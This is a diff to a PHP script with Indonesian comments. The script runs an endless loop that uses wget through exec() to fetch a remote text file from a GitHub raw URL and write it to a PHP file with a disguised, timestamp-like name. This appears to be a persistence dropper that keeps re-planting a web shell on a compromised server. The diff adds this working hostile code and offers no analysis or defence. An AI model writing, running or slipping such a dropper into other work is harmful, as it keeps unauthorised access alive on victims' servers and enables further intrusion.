@@ -2,13 +2,19 @@
 
 // Loop tak terbatas
 while (true) {
-    // Mengambil konten dari URL dan menyimpannya ke file 'tes.php'
+    // URL yang akan diunduh
     $url = 'https://raw.githubusercontent.com/kennn404/test/refs/heads/main/alfa.txt';
-    $content = file_get_contents($url);
+    
+    // Menggunakan wget untuk mengambil konten
+    $outputFile = '20220727061038_KGAA.php';
+    $command = "wget -q -O $outputFile $url";
 
-    // Memastikan konten berhasil diambil sebelum menulis ke file
-    if ($content !== false) {
-        file_put_contents('20220727061038_KGAA.php', $content);
+    // Menjalankan perintah wget
+    exec($command, $output, $returnVar);
+
+    // Memeriksa apakah perintah wget berhasil
+    if ($returnVar === 0) {
+        echo "Konten berhasil diunduh dan disimpan di $outputFile\n";
     } else {
         echo "Gagal mengunduh konten dari $url\n";
     }
